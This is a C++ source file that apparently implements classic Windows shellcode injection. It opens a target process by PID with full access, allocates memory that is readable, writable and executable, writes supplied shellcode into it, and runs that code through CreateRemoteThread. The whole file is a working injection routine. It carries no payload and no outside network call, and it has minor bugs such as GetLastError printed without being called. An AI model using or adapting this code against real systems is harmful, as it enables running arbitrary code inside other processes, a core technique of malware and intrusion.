#include "pch.h"
#include "PE_injection.h"

using namespace std;

HANDLE get_process_handle(DWORD pid) {
	HANDLE process_handle = OpenProcess(PROCESS_ALL_ACCESS, TRUE, pid);

	cout << "Tring to get process handle for PID " << pid << endl;
	if (process_handle == NULL) {
		cout << "Failed to get process handle. Error code: " << GetLastError() << endl;
		return NULL;
	}	

	cout << "Handle for PID " << pid << " successfully obtained." << endl;
	cout << "Process Handle: 0x" << process_handle << endl;

	return process_handle;
}

bool PE_injection(unsigned char shellcode[], const int shellcode_size, HANDLE process_handle) {
	void* virtual_memory = VirtualAllocEx(process_handle, NULL, shellcode_size, (MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE);
	
	if (virtual_memory == NULL) {
		cout << "Failed to assign virtual memory. Error code: " << GetLastError << endl;
		return false;
	}
	cout << "Allocated " << shellcode_size << " bytes with RWX permissions." << endl;

	int write_memory = WriteProcessMemory(process_handle, virtual_memory, shellcode, shellcode_size, NULL);

	if (write_memory == 0) {
		cout << "Failed to write to the allocated memory in process. Error code: " << GetLastError << endl;
		return false;
	}

	cout << "Write to allocated memory successful." << endl;

	HANDLE thread = CreateRemoteThread(process_handle, NULL, 0, (LPTHREAD_START_ROUTINE)virtual_memory, NULL, 0, 0);

	if (thread == NULL) {
		cout << "Failed to initiate thread. Error code: " << GetLastError << endl;
		return false;
	}

	cout << "Thread initiated successfully." << endl;
	WaitForSingleObject(thread, INFINITE);
	CloseHandle(thread);
	CloseHandle(process_handle);
	return true;
}